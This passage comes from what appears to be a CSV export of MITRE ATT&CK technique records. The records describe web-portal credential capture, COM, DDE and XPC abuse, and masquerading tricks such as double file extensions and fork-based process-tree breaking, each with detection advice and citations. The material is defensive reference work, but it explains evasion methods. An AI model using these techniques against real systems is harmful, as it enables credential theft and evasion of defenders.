Mimic Jan 2016),(Citation: CopyKittens Nov 2015),(Citation: GitHub PowerSploit May 2012),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Symantec Chafer Dec 2015),(Citation: TrendMicro BlackTech June 2017),(Citation: Talos Kimsuky Nov 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Netscout Stolen Pencil Dec 2018),(Citation: Cybereason Kimsuky November 2020),(Citation: FireEye APT37 Feb 2018),(Citation: Volexity Patchwork June 2018),(Citation: Trend Micro njRAT 2018),(Citation: FireEye APT38 Oct 2018),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Unit42 Redaman January 2019),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Talos ZxShell Oct 2014),(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: 360 Machete Sep 2020),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET RTM Feb 2017),(Citation: jRAT Symantec Aug 2018),(Citation: ESET Telebots Dec 2016),(Citation: EST Kimsuky April 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: Proofpoint NETWIRE December 2020),(Citation: Talos Konni May 2017),(Citation: FireEye APT34 July 2019),(Citation: Securelist Dtrack),(Citation: Prevailion DarkWatchman 2021),(Citation: ESET InvisiMole June 2020),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Dell TG-3390),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Kroll Qakbot June 2020),(Citation: ClearSky Wilted Tulip July 2017),(Citation: GitHub Pupy),(Citation: Symantec Remsec IOCs),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: Securelist Remexi Jan 2019),(Citation: DigiTrust Agent Tesla Jan 2017),"
T1056.003,attack-pattern--69e5226d-05dc-4f15-95d7-44f5ed78d06e,Input Capture: Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.

This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise by exploitation of the externally facing web service.(Citation: Volexity Virtual Private Keylogging)",https://attack.mitre.org/techniques/T1056/003,11 February 2020,30 March 2023,enterprise-attack,1.0,"Collection, Credential Access",File monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.,"Linux, Windows, macOS",File: File Modification,True,T1056,,,,,An externally facing login portal is configured.,,,"(Citation: CrowdStrike IceApple May 2022),"
T1559.001,attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64,Inter-Process Communication: Component Object Model,"Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)

Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",https://attack.mitre.org/techniques/T1559/001,12 February 2020,26 July 2021,enterprise-attack,1.1,Execution,"Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)

Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on. ",Windows,"Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1559,,,,1.0,,,,"(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Trickbot Oct 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Microsoft NICKEL December 2021),(Citation: ESET InvisiMole June 2020),(Citation: ESET Gelsemium June 2021),(Citation: Securelist MuddyWater Oct 2018),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Gamaredon June 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ClearSky MuddyWater June 2019),(Citation: Eset Ramsay May 2020),(Citation: FireEye MuddyWater Mar 2018),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Bromium Ursnif Mar 2017),(Citation: Microsoft COM ACL),(Citation: Microsoft Process Wide Com Keys),(Citation: Microsoft Protected View),(Citation: Microsoft System Wide Com Keys)"
T1559.002,attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d,Inter-Process Communication: Dynamic Data Exchange,"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",https://attack.mitre.org/techniques/T1559/002,12 February 2020,15 September 2023,enterprise-attack,1.3,Execution,"Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).

OLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )",Windows,"Module: Module Load, Process: Process Creation, Script: Script Execution",True,T1559,,,,1.0,,,,"(Citation: McAfee APT28 DDE2 Nov 2017),(Citation: Securelist MuddyWater Oct 2018),(Citation: SentinelOne Valak June 2020),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Palo Alto Sofacy 06-2018),(Citation: Accenture MUDCARP March 2019),(Citation: PWC KeyBoys Feb 2017),(Citation: FireEye MuddyWater Mar 2018),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: FireEye HAWKBALL Jun 2019),(Citation: Talos Cobalt Group July 2018),(Citation: Securelist ScarCruft Jun 2016),(Citation: Rewterz Sidewinder APT April 2020),(Citation: CyberScoop FIN7 Oct 2017),(Citation: Eset Ramsay May 2020),(Citation: Symantec Gallmaker Oct 2018),(Citation: McAfee APT28 DDE1 Nov 2017),(Citation: ESET RTM Feb 2017),(Citation: McAfee Sharpshooter December 2018),(Citation: Proofpoint TA505 June 2018),(Citation: Talos GravityRAT),(Citation: Talos PoetRAT April 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Enigma Reviving DDE Jan 2018),(Citation: Microsoft ASR Nov 2017),(Citation: Microsoft Protected View),(Citation: Microsoft DDE Advisory Nov 2017),(Citation: BleepingComputer DDE Disabled in Word Dec 2017),(Citation: GitHub Disable DDEAUTO Oct 2017),(Citation: Microsoft ADV170021 Dec 2017)"
T1559.003,attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19,Inter-Process Communication: XPC Services,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)

Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",https://attack.mitre.org/techniques/T1559/003,12 October 2021,20 April 2022,enterprise-attack,1.0,Execution,,macOS,Process: Process Access,True,T1559,,Csaba Fitzl @theevilbit of Offensive Security,,0.0,,,,","
T1036.009,attack-pattern--34a80bc4-80f2-46e6-94ff-f3265a4b657c,Masquerading: Break Process Trees,"An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the “parent-child"" relationship for detection, breaking this relationship could result in the adversary’s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) 

On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.

Another example is using the “daemon” syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) ",https://attack.mitre.org/techniques/T1036/009,27 September 2023,03 October 2023,enterprise-attack,1.0,Defense Evasion,,"Linux, macOS","Process: OS API Execution, Process: Process Creation",True,T1036,,Tim (Wadhwa-)Brown,,,,,,","
T1036.007,attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e,Masquerading: Double File Extension,"Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) 

Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)

Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",https://attack.mitre.org/techniques/T1036/007,04 August 2021,14 October 2021,enterprise-attack,1.0,Defense Evasion,"Monitor for files written to disk that contain two file extensions, particularly when the second is an executable.(Citation: Seqrite DoubleExtension)",Windows,"File: File Creation, File: File Metadata",True,T1036,,,,,,,,"(Citation: Crowdstrike MUSTANG PANDA June 2018),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: Cybereason Bazar July 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: Seqrite DoubleExtension),(Citation: HowToGeek ShowExtension)"
T1036.001,attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52,Masquerading: Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)

Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.",https://attack.mitre.org/techniques/T1036/001,10 February 2020,10 February 2020,enterprise-attack,1.0,Defense Evasion,"Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment, look for invalid signatures as well as unusual certificate characteristics and outliers.","Windows, macOS",File: File Metadata,True,T1036,,,,,,,,"(Citation: Kaspersky Regin),(Citation: Securelist ScarCruft Jun 2016),(Citation: ESET Gelsemium June 2021),(Citation: McAfee Netwire Mar 2015),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: objective-see windtail1 dec 2018),(Citation: SANS Windshift August 2018),"
T1036.008,attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471,Masquerading: Masquerade File Type,"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. 

Adversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. 

Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.

Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",https://attack.mitre.org/techniques/T1036/008,08 March 2023,14 June 2023,enterprise-attack,1.0,Defense Evasion,,"Linux, Windows, macOS","Command: Command Execution, File: File Modification",True,T1036,,"Ben Smith, @ezaspy; CrowdStrike Falcon OverWatch",,,,,,"(Citation: Trend Micro AvosLocker Apr 2022),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Lazarus Jun 2020),(Citation: Group IB Ransomware September 2020),(Citation: Dragos Crashoverride 2018),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: McAfee Lazarus Jul 2020),(Citation: Trend Micro Black Basta October 2022),(Citation: file_upload_attacks_pt2)"
T1036.004,attack-pattern--7bdca9d5-d500-4d7d-8c52-5fd47baf4c0c,Masquerading: Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.

Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)",https://attack.mitre.org/techniques/T1036/004,10 February 2020,29 September 2023,enterprise-attack,1.2,Defense Evasion,"Look for changes to tasks and services that do not correlate with known software, patch cycles, etc. Suspicious program execution through scheduled tasks or services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be taken to create tasks or services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","Linux, Windows, macOS","Command: Command Execution, Scheduled Job: Scheduled Job Metadata, Scheduled Job: Scheduled Job Modification, Service: Service Creation, Service: Service Metadata",True,T1036,,,,,,,,"(Citation: Symantec Orangeworm April 2018),(Citation: Tarrask scheduled task),(Citation: ESET TeleBots Oct 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Fysbis Dr Web Analysis),(Citation: Bitdefender StrongPity June 2020),(Citation: Trend Micro Tick November 2019),(Citation: HP SVCReady Jun 2022),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: Zscaler Higaisa 2020),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Mandiant APT41),(Citation: Check Point Meteor Aug 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit 42 Hildegard Malware),(Citation: Talos Frankenstein June 2019),(Citation: Symantec Catchamas April 2018),(Citation: Lunghi Iron Tiger Linux),(Citation: Volexity SolarWinds),(Citation: Sophos Maze VM September 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Microsoft Win Defender Truvasys Sep 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky Carbanak),(Citation: Mandiant FIN5 GrrCON Oct 2016),(Citation: ESET Okrum July 2019),(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023),(Citation: FireEye FIN6 Apr 2019),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Mandiant UNC3890 Aug 2022),(Citation: Cyble Black Basta May 2022),(Citation: Talos Promethium June 2020),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: Symantec Volgmer Aug 2014),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: ESET Crutch December 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Mandiant APT1 Appendix),(Citation: Mandiant FIN13 Aug 2022),(Citation: Bitdefender Naikon April 2021),(Citation: FireEye KEGTAP SINGLEMALT October 2020),(Citation: Group IB APT 41 June 2021),(Citation: Minerva Labs Black Basta May 2022),(Citation: Talos TinyTurla September 2021),(Citation: ESET Machete July 2019),(Citation: MoustachedBouncer ESET August 2023),(Citation: TrendMicro RawPOS April 2015),(Citation: Morphisec FIN7 June 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ASERT InnaputRAT April 2018),(Citation: McAfee Shamoon December 2018),(Citation: Microsoft SAM),(Citation: Symantec Backdoor.Nidiran),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Unit42 OceanLotus 2017),(Citation: Cybereason Bazar July 2020),(Citation: CrowdStrike Grim Spider May 2019),(Citation: Intrinsec Egregor Nov 2020),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: Malwarebytes Higaisa 2020),(Citation: Kroll RawPOS Jan 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Unit42 RDAT July 2020),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: Unit42 Redaman January 2019),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: FireEye APT32 May 2017),(Citation: FireEye APT10 April 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Trend Micro Black Basta May 2022),(Citation: ESET Telebots Dec 2016),(Citation: DFIR Phosphorus November 2021),(Citation: ESET InvisiMole June 2020),"
T1036.005,attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2,Masquerading: Match Legitimate Name or Location,"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.

Adversaries may also use the same icon of the file they are trying to mimic.",https://attack.mitre.org/techniques/T1036/005,10 February 2020,14 September 2023,enterprise-attack,1.2,Defense Evasion,"Collect file hashes; file names that do not match their expected hash are suspect. Perform file monitoring; files with known names but in unusual locations are suspect. Likewise, files that are modified outside of an update or patch are suspect.

If file names are mismatched between the file name on disk and that of the binary's PE metadata, this is a likely indicator that a binary was renamed after it was compiled. Collecting and comparing disk and resource filenames for binaries by looking to see if the InternalName, OriginalFilename, and/or ProductName match what is expected could provide useful leads, but may not always be indicative of malicious activity. (Citation: Elastic Masquerade Ball) Do not focus on the possible names a file could have, but instead on the command-line arguments that are known to be used and are distinct because it will have a better rate of detection.(Citation: Twitter ItsReallyNick Masquerading Update)

In containerized environments, use image IDs and layer hashes to compare images instead of relying only on their names.(Citation: Docker Images) Monitor for the unexpected creation of new resources within your cluster in Kubernetes, especially those created by atypical users.","Containers, Linux, Windows, macOS","File: File Metadata, Image: Image Metadata, Process: Process Creation, Process: Process Metadata",True,T1036,Application Control,"Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,,,,,"(Citation: NCSC Cyclops Blink February 2022),(Citation: CrowdStrike IceApple May 2022),(Citation: FinFisher Citation),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Tarrask scheduled task),(Citation: FBI FLASH APT39 September 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Fysbis Dr Web Analysis),(Citation: Secure List Bad Rabbit),(Citation: ESET Casbaneiro Oct 2019),(Citation: Bitdefender StrongPity June 2020),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: Microsoft FinFisher March 2018),(Citation: Unit 42 BackConfig May 2020),(Citation: Red Canary NETWIRE January 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: TrendMicro DarkComet Sept 2014),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: Cisco Talos Intelligence Group),(Citation: Cymmetria Patchwork),(Citation: Securelist Calisto July 2018),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Symantec Whitefly March 2019),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Trusteer Carberp October 2010),(Citation: ESET Grandoreiro April 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: ESET Nomadic Octopus 2018),(Citation: netlab360 rotajakiro vs oceanlotus),(Citation: TrendMicro EarthLusca 2022),(Citation: Trend Micro IXESHE 2012),(Citation: Picus Sodinokibi January 2020),(Citation: Mandiant APT41),(Citation: FireEye admin@338),(Citation: Recorded Future REDDELTA July 2020),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Baumgartner Naikon 2015),(Citation: Volexity SolarWinds),(Citation: Volexity Ocean Lotus November 2020),(Citation: Talos Bisonal Mar 2020),(Citation: CERT-FR PYSA April 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Trustwave GoldenSpy June 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Cybereason Chaes Nov 2020),(Citation: Dragos Crashoverride 2017),(Citation: District Court of NY APT10 Indictment December 2018),(Citation: Palo Alto Brute Ratel July 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Kaspersky Carbanak),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Dragos EKANS),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Guidepoint SUPERNOVA Dec 2020),(Citation: Proofpoint TA2541 February 2022),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: ESET InvisiMole June 2018),(Citation: Securelist Machete Aug 2014),(Citation: CrowdStrike Ryuk January 2019),(Citation: Unit 42 MechaFlounder March 2019),(Citation: Mandiant UNC3890 Aug 2022),(Citation: reed thiefquest ransomware analysis),(Citation: MSTIC FoggyWeb September 2021),(Citation: Cisco Talos Avos Jun 2022),(Citation: FireEye MuddyWater Mar 2018),(Citation: Talos Promethium June 2020),(Citation: McAfee Cuba April 2021),(Citation: SentinelOne NobleBaron June 2021),(Citation: Secureworks BRONZE SILHOUETTE May 2023),(Citation: Kaspersky WIRTE November 2021),(Citation: Talos Rocke August 2018),(Citation: FOX-IT May 2016 Mofang),(Citation: Cylance Dust Storm),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Check Point Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET PipeMon May 2020),(Citation: BitDefender Chafer May 2020),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Mandiant APT1 Appendix),(Citation: Bitdefender Naikon April 2021),(Citation: Talos MuddyWater May 2019),(Citation: Unit 42 Gamaredon February 2022),(Citation: Group IB APT 41 June 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Trend Micro Skidmap),(Citation: Talos TinyTurla September 2021),(Citation: Lotus Blossom Jun 2015),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET Machete July 2019),(Citation: Unit 42 QUADAGENT July 2018),(Citation: Mandiant APT1),(Citation: Intezer Doki July 20),(Citation: MoustachedBouncer ESET August 2023),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Rewterz Sidewinder COVID-19 June 2020),(Citation: Microsoft DTC),(Citation: Unit42 SUPERNOVA Dec 2020),(Citation: Symantec RAINDROP January 2021),(Citation: Carbon Black Shlayer Feb 2019),(Citation: FoxIT Wocao December 2019),(Citation: FireEye APT28),(Citation: Cycraft Chimera April 2020),(Citation: Securelist Octopus Oct 2018),(Citation: ESET Gelsemium June 2021),(Citation: ASERT InnaputRAT April 2018),(Citation: Mandiant APT29 Microsoft 365 2022),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: ZScaler Hacking Team),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Intego Shlayer Feb 2018),(Citation: IBM Grandoreiro April 2020),(Citation: Group IB Silence Sept 2018),(Citation: Cybereason StrifeWater Feb 2022),(Citation: McAfee Honeybee),(Citation: Secureworks MCMD July 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Eset Ramsay May 2020),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Cybereason Bazar July 2020),(Citation: KISA Operation Muzabi),(Citation: McAfee Sharpshooter December 2018),(Citation: Microsoft NICKEL December 2021),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Mandiant Suspected Turla Campaign February 2023),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Antiy CERT Ramsay April 2020),(Citation: Medium Metamorfo Apr 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Morphisec ShellTea June 2019),(Citation: Mandiant APT29 Eye Spy Email Nov 22),(Citation: Microsoft Analyzing Solorigate Dec 2020),(Citation: CyberBit Dtrack),(Citation: Crowdstrike Indrik November 2018),(Citation: Kaspersky ProjectSauron Full Report),(Citation: Cybereason Kimsuky November 2020),(Citation: Volexity Patchwork June 2018),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Unit42 RDAT July 2020),(Citation: Qualys LolZarus),(Citation: Malwarebytes Pony April 2016),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Kaspersky Poseidon Group),(Citation: Leonardo Turla Penquin May 2020),(Citation: 360 Machete Sep 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Symantec Tick Apr 2016),(Citation: wardle evilquest partii),(Citation: FireEye TRITON 2019),(Citation: Prevx Carberp March 2011),(Citation: ESET Telebots Dec 2016),(Citation: Microsoft Winnti Jan 2017),(Citation: Talos Konni May 2017),(Citation: NCSC GCHQ Small Sieve Jan 2022),(Citation: DFIR Phosphorus November 2021),(Citation: Anomali Static Kitten February 2021),(Citation: ESET InvisiMole June 2020),(Citation: CrowdStrike Wizard Spider October 2020),(Citation: ESET Hermetic Wizard March 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: 